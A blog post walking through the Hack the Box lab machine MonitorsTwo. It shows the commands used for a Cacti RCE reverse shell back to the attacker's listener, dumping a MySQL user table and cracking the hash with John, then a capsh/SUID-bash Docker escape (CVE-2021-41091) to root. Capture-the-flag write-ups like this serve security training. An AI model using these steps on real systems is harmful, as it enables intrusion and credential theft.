+++
author = "Nick"
categories = ["hack the box", "Easy", "Linux"]
date = 2023-09-02T11:00:00.000Z
publishDate = 2023-09-02T11:00:00.000Z
description = " "
summary = ""
draft = false
slug = "hack-the-box-monitorstwo"
tags = ["hack the box", "Easy", "Linux", "Docker", "CVE-2021-41091", "RCE", "mysql", "John", "CVE-2021-41091"]
title = "Hack the Box - monitorstwo"
url = "/hack-the-box-monitorstwo"
thumbnail = "/images/monitorstwo/logo.png"
+++

Welcome back! Today we're going to go through the Hack the Box machine MonitorsTwo. This is listed as an easy Linux machine. So let's see what's in store.

As usual, we start with our standard `Rustscan` of the target. Here are the results:

```
PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    syn-ack nginx 1.18.0 (Ubuntu)
|_http-title: Login to Cacti
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

We see that there is a `Cacti` service running on port `80`. This recently [had an `Unauthenticated RCE`](https://www.sonarsource.com/blog/cacti-unauthenticated-remote-code-execution/) disclosed, so I wonder if that's our way in. 

Let's see what's being hosted. Sure enough, when we get to the landing page, we see `cacti` running with the vulnerable version - `1.2.22`. 

![](/images/monitorstwo/mon2.png)

So we grab our PoC from [FredBrave](https://github.com/FredBrave/CVE-2022-46169-CACTI-1.2.22). First we need to setup a `nc` listener. Then we can fire off the script with the supplied parameters and we should get a shell back!

`python3 CVE-2022-46169.py -u http://10.129.228.231 --LHOST=10.10.14.2 --LPORT=6969`

Sure enough, we catch our listener back.

![](/images/monitorstwo/mon22.png)

With a limited shell, we copy of `linpeas` and start some enumeration. We see that we are in a `Docker` container. We also see that we can read `entrypoint.sh` as well as have `capsh` to list other privileges we might be able to abuse. So we look at the `entrypoint.sh` file and see we get a username and password for the `mysql` database.

![](/images/monitorstwo/mon23.png)

So we can connect to this `database`. We need to stabilize the shell in this case.

`/usr/bin/script -qc /bin/bash /dev/null`
`ctrl-z`
`stty raw -echo; fg;`

Now with a stable shell we are able to connect reliably to the `mysql` service. 

`mysql -h db -u root -p`

Once we're in we `show databases;`

![](/images/monitorstwo/mon24.png)

Then we `use cacti;` to select the `database`. Then we `show tables;`. In the tables we see `user_auth`, so we dump it.

![](/images/monitorstwo/mon25.png)

![](/images/monitorstwo/mon26.png)

Now we have `marcus` as a user and his hash. We can run this through `john` and see what comes back.

`john hash --wordlist=/usr/share/wordlists/rockyou.txt`

![](/images/monitorstwo/mon27.png)

Perfect, a password! Let's try to `SSH` into the box with it. We log in and snag our `user.txt` flag.

![](/images/monitorstwo/user.png)

Now we transfer over `linpeas` and let that start digging. After quite a bit of time, of snooping with `pspy` and manual enumeration, we circle back to what `linpeas` had originally shown us:

![](/images/monitorstwo/mon28.png)

We check the `docker` version and see that it's `20.10.5`. Researching this version tells us there is a vulnerability in it - CVE-2021-41091. Some digging finds us a [Poc](https://github.com/UncleJ4ck/CVE-2021-41091). From the repo, we need to do three things. Connect back to the containered instance. Change the `SUID` bit on `bash` then run the `PoC` script on the host. So we connect back to the containered system via our earlier exploit. Now we need to change the `SUID` bit on `Bash`. In this case it's fairly easy, since before we noted that `capsh` was a potential exploitable path. We can use [this GTFObins](https://gtfobins.github.io/gtfobins/capsh/) command to give us that exactly.

Command:
`./capsh --gid=0 --uid=0 --`

![](/images/monitorstwo/mon29.png)

This gives us a `root` shell on the container. We can then give the standard `chmod u+s /bin/bash` to give us that `SUID` bit.

![](/images/monitorstwo/mon30.png)

Step 2, check. Now we upload `exp.sh` on the target as `marcus`. We answer `yes` to the prompt. Then we go to the full vulnerable path and execute `bash -p` to get `root`.

![](/images/monitorstwo/root.png)

There we have it, a root shell with another `root.txt` flag in the bank! 